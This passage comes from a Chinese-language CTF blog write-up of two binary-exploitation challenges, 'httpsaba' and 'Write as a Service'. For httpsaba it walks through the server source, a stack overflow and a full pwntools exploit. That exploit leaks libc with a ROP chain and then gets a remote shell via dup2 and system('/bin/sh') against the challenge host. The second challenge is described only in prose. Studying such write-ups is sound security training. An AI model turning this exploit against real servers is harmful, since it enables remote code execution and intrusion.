class="line"></span><br></pre></td></tr></table></figure>
+
+
+
+<h1 id="httpsaba"><a href="#httpsaba" class="headerlink" title="httpsaba"></a>httpsaba</h1><blockquote>
+<p>amd64-64-little，Partial RELRO， No canary found， NX enabled，No PIE (0x400000)， Enabled</p>
+</blockquote>
+<blockquote>
+<p>第一次做这种题。看完 wp ，我寻思我也不会 rop 的这种用法😕，记录一下。</p>
+</blockquote>
+<p>这是一个小型的静态网站，我们直接运行 server ，就能在浏览器上访问到 localhost:9080/index.html。但是会发现有时可以，有时访问不到，访问其他路径也有点问题。</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> tree ./</span></span><br><span class="line">./</span><br><span class="line">├── html</span><br><span class="line">│   ├── fox.jpg</span><br><span class="line">│   └── index.html</span><br><span class="line">├── libc-2.31.so</span><br><span class="line">├── server</span><br><span class="line">└── server.c</span><br><span class="line"></span><br><span class="line">1 directory, 6 files</span><br></pre></td></tr></table></figure>
+
+<p>读了下源码，其主函数的核心部分是如下。可以看到每建立一次连接，http_saba 核心功能都是只运行一次，但是 <a target="_blank" rel="noopener" href="https://blog.csdn.net/hzrandd/article/details/50724697">fork</a> 出了一个子进程。虽然 http_saba 里面没有循环，只接受一次数据，但由于每次都 fork 出了一个新进程，相当于每连接一次就有两个个 http_saba 函数在接收数据。在后面发送完数据后，<code>ctrl+c</code> 中断时，我们也能看到两个 <code>[*] Closed connection to ...</code> 。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Entry point</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="comment">/*...sockect创建与绑定，端口是9080...*/</span></span><br><span class="line">  <span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line">    <span class="comment">/*...接收client...*/</span></span><br><span class="line">    pid = fork();</span><br><span class="line">    <span class="keyword">if</span> (pid == <span class="number">-1</span>) &#123;</span><br><span class="line">      perror(<span class="string">&quot;fork&quot;</span>);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (pid == <span class="number">0</span>) &#123;</span><br><span class="line">      <span class="comment">/* HTTP server */</span></span><br><span class="line">      alarm(<span class="number">30</span>);</span><br><span class="line">      http_saba(fd);<span class="comment">//数据处理的核心部分</span></span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">0</span>);<span class="comment">//结束程序</span></span><br><span class="line">    &#125; <span class="comment">/*...waitpid...*/</span></span><br><span class="line">    &#125;</span><br><span class="line">    close(fd);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>http_saba 函数也是 server 程序的核心功能，主要完成用户数据的响应。</p>
+<p>首先定义了一些局部变量。这里用的 recvline 函数后面会解释。结合前面子进程的概念，可以知道这里也会被调用两次，因此数据是可以分批读入的。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">char</span> *p;<span class="comment">//用于临时存放当前处理的字符串</span></span><br><span class="line"><span class="keyword">char</span> path[PATH_MAX];<span class="comment">//0x100，文件路径，用于响应前打开指定文件</span></span><br><span class="line"><span class="keyword">char</span> request[REQUEST_MAX+<span class="number">1</span>];<span class="comment">//0x100+1，存放request数据</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">stat</span> <span class="title">st</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Receive request header */</span></span><br><span class="line">recvline(sock, request, REQUEST_MAX);<span class="comment">//0x100</span></span><br></pre></td></tr></table></figure>
+
+<p>以空格为token切割，从这可以看出数据头部应该是：<code>GET(space) </code>.</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Check request method */</span></span><br><span class="line">  p = strtok(request, <span class="string">&quot; &quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> (<span class="built_in">memcmp</span>(p, <span class="string">&quot;GET&quot;</span>, <span class="number">3</span>) != <span class="number">0</span>) &#123;</span><br><span class="line">     <span class="comment">/*...error response and return...*/</span></span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>
+
+<p>第二部分数据以 <code>/</code> 开头，不能含有 <code>..</code> 。因此不能访问上一级目录的文件。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Check path */</span></span><br><span class="line">  p = strtok(<span class="literal">NULL</span>, <span class="string">&quot; &quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> (p[<span class="number">0</span>] != <span class="string">&#x27;/&#x27;</span>) &#123;</span><br><span class="line">     <span class="comment">/*...error response and return...*/</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> (<span class="built_in">strstr</span>(p, <span class="string">&quot;..&quot;</span>)) &#123;</span><br><span class="line">     <span class="comment">/*...error response and return...*/</span></span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>
+
+<p>定义文件路径，在<code>./html</code> 后追加路径，默认是 <code>./html/index.html</code> 。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Check file */</span></span><br><span class="line"><span class="built_in">strcpy</span>(path, <span class="string">&quot;./html&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> (p[<span class="number">1</span>] == <span class="string">&#x27;\0&#x27;</span>)</span><br><span class="line">  <span class="built_in">strncat</span>(path, <span class="string">&quot;/index.html&quot;</span>, PATH_MAX<span class="number">-1</span>);<span class="comment">//0x100-1</span></span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">  <span class="built_in">strncat</span>(path, p, PATH_MAX<span class="number">-1</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (stat(path, &amp;st) != <span class="number">0</span>) &#123;</span><br><span class="line">  <span class="comment">/*...error response and return...*/</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>最后将文件内容以响应数据的形式返回。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Read file */</span></span><br><span class="line">  <span class="keyword">char</span> *content = <span class="built_in">calloc</span>(<span class="keyword">sizeof</span>(<span class="keyword">char</span>), st.st_size);</span><br><span class="line">  <span class="comment">/*...if error,then return...*/</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">int</span> fd = open(path, O_RDONLY);</span><br><span class="line">  <span class="comment">/*...if error, then free and return...*/</span></span><br><span class="line">  read(fd, content, st.st_size);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Make response */</span></span><br><span class="line">  http_response(sock, <span class="string">&quot;200 OK&quot;</span>,</span><br><span class="line">                content, st.st_size);</span><br><span class="line">  <span class="built_in">free</span>(content);</span><br></pre></td></tr></table></figure>
+
+<p>这里要注意，recvline 函数接收数据的时候，以 <code>/r/n</code> 表示一段请求数据的结尾：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">recvline</span><span class="params">(<span class="keyword">int</span> fd, <span class="keyword">char</span> *buf, <span class="keyword">int</span> size)</span> </span>&#123;<span class="comment">//recvline(sock, request, REQUEST_MAX);//0x100</span></span><br><span class="line">  <span class="keyword">char</span> c;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">memset</span>(buf, <span class="number">0</span>, size);</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i != size; i++) &#123;</span><br><span class="line">    <span class="keyword">if</span> (read(fd, &amp;c, <span class="number">1</span>) &lt;= <span class="number">0</span>) <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    <span class="keyword">if</span> (c == <span class="string">&#x27;\r&#x27;</span>) &#123;<span class="comment">//遇到一个回车符 &#x27;\r&#x27;，判断是否继续接收</span></span><br><span class="line">      <span class="keyword">if</span> (read(fd, &amp;c, <span class="number">1</span>) &lt;= <span class="number">0</span>) <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">      <span class="keyword">if</span> (c == <span class="string">&#x27;\n&#x27;</span>) &#123;<span class="comment">//回车+换行符表示数据终止</span></span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        buf[i] = <span class="string">&#x27;\r&#x27;</span>;</span><br><span class="line">        buf[++i] = c;<span class="comment">//继续存</span></span><br><span class="line">      &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      buf[i] = c;<span class="comment">//直接接收</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>响应的格式如下，我们可以以 <code>HTTP/1.1 %s\r\n</code> 为标志，识别一段数据响应。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">http_response</span><span class="params">(<span class="keyword">int</span> fd, <span class="keyword">char</span> *status, <span class="keyword">char</span> *content, <span class="keyword">int</span> length)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (length &lt; <span class="number">0</span>)</span><br><span class="line">    length = <span class="built_in">strlen</span>(content);</span><br><span class="line"></span><br><span class="line">  dprintf(fd, <span class="string">&quot;HTTP/1.1 %s\r\n&quot;</span>, status);</span><br><span class="line">  dprintf(fd, <span class="string">&quot;Content-Length: %d\r\n&quot;</span>, length);</span><br><span class="line">  dprintf(fd, <span class="string">&quot;Connection: close\r\n&quot;</span>);</span><br><span class="line">  dprintf(fd, <span class="string">&quot;Content-Type: text/html; charset=UTF-8\r\n\r\n&quot;</span>);</span><br><span class="line">  write(fd, content, length);</span><br><span class="line">  <span class="comment">/* content有两种，file content 或 RESPONSE_TEMPLATE(&quot;error&quot;)</span></span><br><span class="line"><span class="comment">  #define RESPONSE_TEMPLATE(body)                   \</span></span><br><span class="line"><span class="comment">  &quot;&lt;!DOCTYPE html&gt;\n&quot;                             \</span></span><br><span class="line"><span class="comment">  &quot;&lt;html&gt;\n&quot;                                      \</span></span><br><span class="line"><span class="comment">  &quot;  &lt;head&gt;\n&quot;                                    \</span></span><br><span class="line"><span class="comment">  &quot;    &lt;meta charset=\&quot;utf-8\&quot;&gt;\n&quot;                \</span></span><br><span class="line"><span class="comment">  &quot;  &lt;/head&gt;\n&quot;                                   \</span></span><br><span class="line"><span class="comment">  &quot;  &lt;body&gt;\n&quot;                                    \</span></span><br><span class="line"><span class="comment">  &quot;    &lt;p&gt;&quot;body&quot;&lt;/p&gt;\n&quot;                           \</span></span><br><span class="line"><span class="comment">  &quot;  &lt;/body&gt;\n&quot;                                   \</span></span><br><span class="line"><span class="comment">  &quot;&lt;/html&gt;\n&quot;</span></span><br><span class="line"><span class="comment">  */</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>根据前面的分析，我们可以先写一个脚本来验证请求数据的格式是否正确，可以看到 server 能正常返回文件内容。</p>
+<p><img src="https://i.loli.net/2021/11/07/7EtbnKSN1zIefaP.png"></p>
+<p>前面说过，程序会先 fork 出一个子进程，再执行 http_saba 。由于子进程继承了父进程的环境，它们属于同一个客户连接中的响应，同时http_saba 函数中所有操作都是在同一个变量、同一个地址进行的。我们进一步验证一下，这次给 server 发送两段数据，可以看到只响应了 <code>./html/index.html</code>的数据。为什么呢？这里需要结合前面的源码来看。</p>
+<ul>
+<li>两个进程虽然同时存在，但父进程应该比子进程快一点点。我不太确定是否如此，但两个之间肯定有一个较快的。</li>
+<li>较快的进程a取了 request 数据的前 0x100字节，缓冲区中剩下的数据被进程b取了。</li>
+<li>a进而判断 request 头和 path，因为都是 ‘\x00’，最终 path 被赋值为 <code>./html/index.html</code>。</li>
+<li>a在前，b在后。因为 b 做每一行判断的时候 a 都先执行了，所以就算那些判断失败，变量都还是原来的值（经a赋值后的值），因此所有的 check 都能通过。</li>
+<li>最终a和b打开的是相同的文件。但是注意文件使用 chunk 存储的，两个 calloc 回来的 chunk 都存放在同一个变量上，这里会有覆盖的问题。emm，由于运行时间的差距是一行或多行代码的差距，后面的运行就有很多种可能了。不过从实验结果来看，猜测是快一点的进程刚响应完，free的是被另一个进程覆盖的 content 变量，导致第二段数据无响应，也不报错。</li>
+</ul>
+<p><img src="https://i.loli.net/2021/11/07/JuEYwr2AWkg74Ki.png"></p>
+<p>谁先谁后没关系，我们也无从验证。不过可以肯定的是，两个进程在共享资源，我们能输入 0x200 的有效数据。但是从源码上看，局部变量 request 数据 只有 0x100+1 的长度。出过栈题的应该都比较敏感，把变量放在最后一个定义，是为了栈溢出的时候好覆盖… ida看了下，偏移 0x138，我们可以写个脚本试一下，或者用 gdb 调一下。</p>
+<p><img src="https://i.loli.net/2021/11/07/1JsbKy6SnfQtwpV.png"></p>
+<p>问题来了，数据是以什么形式返回呢？看wp的时候才知道 ROP 模块提供了 httpresponse 方法，能构建一段以 http 响应格式返回的 rop链。利用 ROP 模块取得 libc 地址后，再打一次栈溢出执行 binsh 就完事了。</p>
+<p>exp：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.binary=ELF(<span class="string">&#x27;./server&#x27;</span>)</span><br><span class="line">elf=ELF(<span class="string">&#x27;./server&#x27;</span>)</span><br><span class="line">libc=ELF(<span class="string">&#x27;./libc-2.31.so&#x27;</span>)</span><br><span class="line">SOCKFD = <span class="number">4</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get</span>(<span class="params">payload</span>):</span></span><br><span class="line">	<span class="keyword">global</span> p </span><br><span class="line">	p = remote(<span class="string">&#x27;pwn.bsidesahmedabad.in&#x27;</span>, <span class="number">9080</span>)</span><br><span class="line">	py=flat(&#123;</span><br><span class="line">		<span class="number">0</span>:<span class="string">b&#x27;GET /&#x27;</span>,</span><br><span class="line">		<span class="number">255</span>: <span class="string">b&#x27;\r&#x27;</span>,</span><br><span class="line">		<span class="number">0x138</span>:[</span><br><span class="line">			payload</span><br><span class="line">			],</span><br><span class="line">		&#125;,filler=<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">	p.send(py+<span class="string">b&#x27;\r\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">rop=ROP(elf)</span><br><span class="line">rop.http_response(<span class="number">4</span>,elf.got[<span class="string">&#x27;write&#x27;</span>])</span><br><span class="line">get(rop.chain())</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;&lt;/html&gt;\nHTTP/1.1&#x27;</span>)</span><br><span class="line">libcbase=u64(p.recvline().strip().ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))- libc.symbols[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">success(<span class="built_in">hex</span>(libcbase))</span><br><span class="line">libc.address=libcbase</span><br><span class="line"></span><br><span class="line">rop = ROP(libc)</span><br><span class="line">rop.dup2(SOCKFD, <span class="number">0</span>)</span><br><span class="line">rop.dup2(SOCKFD, <span class="number">1</span>)</span><br><span class="line">rop.dup2(SOCKFD, <span class="number">2</span>)</span><br><span class="line">rop.system(<span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh&#x27;</span>)))</span><br><span class="line">get(rop.chain())</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b&#x27;&lt;/html&gt;\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<h1 id="Write-as-a-Service"><a href="#Write-as-a-Service" class="headerlink" title="Write as a Service"></a>Write as a Service</h1><blockquote>
+<p>amd64-64-little，Full RELRO，No canary found，NX enabled，PIE enabled</p>
+</blockquote>
+<p>四个 write功能：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">to_local_buf</span><span class="params">(<span class="keyword">void</span>)</span></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> buf[BUF_SIZE] = &#123;&#125;;<span class="comment">//0x20</span></span><br><span class="line">  <span class="keyword">while</span> (<span class="number">1</span>)&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;content?\n&gt; &quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (<span class="number">0</span> &lt; readline(buf, READ_SIZE)) <span class="keyword">break</span>;<span class="comment">//0x20-1</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">to_alloced_buf</span><span class="params">(<span class="keyword">void</span>)</span></span>&#123;</span><br><span class="line">  <span class="keyword">char</span>* buf;</span><br><span class="line">  <span class="keyword">while</span> (<span class="number">1</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span> (buf == <span class="literal">NULL</span>) buf = (<span class="keyword">char</span>*)<span class="built_in">malloc</span>(BUF_SIZE);<span class="comment">//0x20</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;content?\n&gt; &quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (<span class="number">0</span> &lt; readline(buf, READ_SIZE)) <span class="keyword">break</span>;<span class="comment">//no free</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">to_devnull</span><span class="params">(<span class="keyword">void</span>)</span></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> buf[BUF_SIZE] = &#123;&#125;;</span><br><span class="line">  FILE* fp = fopen(<span class="string">&quot;/dev/null&quot;</span>, <span class="string">&quot;w&quot;</span>);</span><br><span class="line">  <span class="keyword">while</span> (<span class="number">1</span>)&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;content?\n&gt; &quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (<span class="number">0</span> &lt; readline(buf, READ_SIZE)) <span class="keyword">break</span>;<span class="comment">//0x20</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">fputs</span>(buf, fp);</span><br><span class="line">  fclose(fp);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">to_stdout</span><span class="params">(<span class="keyword">void</span>)</span></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> buf[BUF_SIZE] = &#123;&#125;;</span><br><span class="line">  FILE* fp = <span class="built_in">stdout</span>;</span><br><span class="line">  <span class="keyword">while</span> (<span class="number">1</span>)&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;content?\n&gt; &quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (read(<span class="number">0</span>, buf, READ_SIZE) != <span class="number">-1</span>) <span class="keyword">break</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">fputs</span>(buf, fp);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>当时群上有师傅说 buf 变量可以重用的时候我没看懂，走捷径只看源码二进制废物了属于是😅。</p>
+<p>拖进 ida 分析发现 stdout 中的 fp 和 alloced buf 中的 buf 变量都是在 rbp - 8h 的位置。仔细看看 alloced buf 那段 malloc 的代码，先判断了 <code>if (buf == NULL)</code>，为空才申请。也就是说申请过之后，每次都是重写这个 chunk。这里 buf 的位置又与 stdout 中存储 file* stdout 的 fp 变量重合，如果先运行 stdout ，之后再写 alloced buf 的时候就是写到 stdout 结构中了：</p>
+<p><img src="https://i.loli.net/2021/11/08/fyVMHdQIs1WhgGA.png"></p>
+<p>测试一下，发现确实是能写进去的：</p>
+<p><img src="https://i.loli.net/2021/11/08/fJXiOTRSC3ldcsj.png"></p>
+<p>打 IO FILE，改 read 指针，可以泄露libc地址。但是由于地址随机，这里需要爆破一下正确的 read_end地址。</p>
+<p><img src="https://i.loli.net/2021/11/08/N3QFuImwx4sY1KD.png"></p>
+<p>加上 local buf 又有一个栈溢出漏洞可以劫持程序流，打 one gadget 或 system(‘/bin/sh’) 都行。</p>
+<p><img src="https://i.loli.net/2021/11/08/eQ2UOJRdEW6tM7m.png"></p>
+<p>【 exp就不放了】</p>
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/ctf/" rel="tag"># ctf</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2021/11/01/hack-lu-2021/" rel="prev" title="Hack.lu ctf 2021">
+      <i class="fa fa-chevron-left"></i> Hack.lu ctf 2021
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/2021/11/10/%E4%B8%80%E4%BA%9Barm%E9%A2%98/" rel="next" title="一些arm题">
+      一些arm题 <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+    <div class="comments" id="valine-comments"></div>
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#BabyBOF-RCE"><span class="nav-number">1.</span> <span class="nav-text">BabyBOF:RCE</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#padnote"><span class="nav-number">2.</span> <span class="nav-text">padnote</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#httpsaba"><span class="nav-number">3.</span> <span class="nav-text">httpsaba</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Write-as-a-Service"><span class="nav-number">4.</span> <span class="nav-text">Write as a Service</span></a></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">7ee1n</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">11</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">4</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">4</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+
+
+  <div class="links-of-blogroll motion-element">
+    <div class="links-of-blogroll-title"><i class="fa fa-link fa-fw"></i>
+      Links
+    </div>
+    <ul class="links-of-blogroll-list">
+        <li class="links-of-blogroll-item">
+          <a href="https://custuvo.github.io/" title="https:&#x2F;&#x2F;custuvo.github.io&#x2F;" rel="noopener" target="_blank">❤Cu3tuv0❤</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://brooke-hub.github.io/" title="https:&#x2F;&#x2F;brooke-hub.github.io&#x2F;" rel="noopener" target="_blank">Wendy</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://r1nd0.github.io/" title="https:&#x2F;&#x2F;r1nd0.github.io&#x2F;" rel="noopener" target="_blank">R1nd0神</a>
+        </li>
+    </ul>
+  </div>
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2021</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">7ee1n</span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://muse.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Muse</a> 强力驱动
+  </div>
+
+        
+
+
+
+
+
+
+
+
+      </div>
